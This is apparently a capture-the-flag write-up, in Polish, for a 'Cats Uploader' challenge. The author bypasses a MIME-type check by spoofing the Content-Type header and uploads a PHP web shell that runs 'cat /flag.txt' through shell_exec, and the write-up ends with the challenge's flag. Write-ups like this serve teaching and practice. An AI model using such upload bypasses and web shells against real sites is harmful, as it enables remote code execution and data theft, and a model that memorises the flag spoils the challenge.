# Cats Uploader
![](14bcddfda4e9942c2790a6671720bb99)

Próba wysłania plik nie będącego zdjęciem, powoduje że pojawia się wiadomość `Mimetype is not image/png or image/jpeg.`. Spróbowałem więc wysłać plik ze zmienionym `Content-Type`. Aplikacja przyjeła ten plik. Napisałem złośliwy kod w PHP, który wyświetli flagę i spróbuję uruchomić w ten plik.

Kod:
```
<?php
$output = shell_exec('cat /flag.txt');
echo "<pre>$output</pre>";
exit;
?>
```

Napisałem program, który wysyła ten kod PHP i wchodzi na miejsce, gdzie został umieszczony wykonując złośliwy kod. Program zwraca flagę.

Kod: `solution/cats.py`

Flaga: `WSIZ{a1way5_v4lidat3_m0re_th4n_ju5t_4_m1me7ype}`